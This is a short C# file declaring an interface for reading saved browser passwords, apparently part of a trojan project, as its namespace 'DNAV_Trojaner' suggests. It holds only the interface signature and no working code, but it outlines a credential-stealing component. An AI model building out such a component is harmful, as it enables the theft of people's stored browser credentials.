using System.Collections.Generic;

namespace DNAV_Trojaner
{
    interface IPasswordReader
    {
        IEnumerable<Credential> GetPasswords();
        string BrowserName { get; }
    }
}
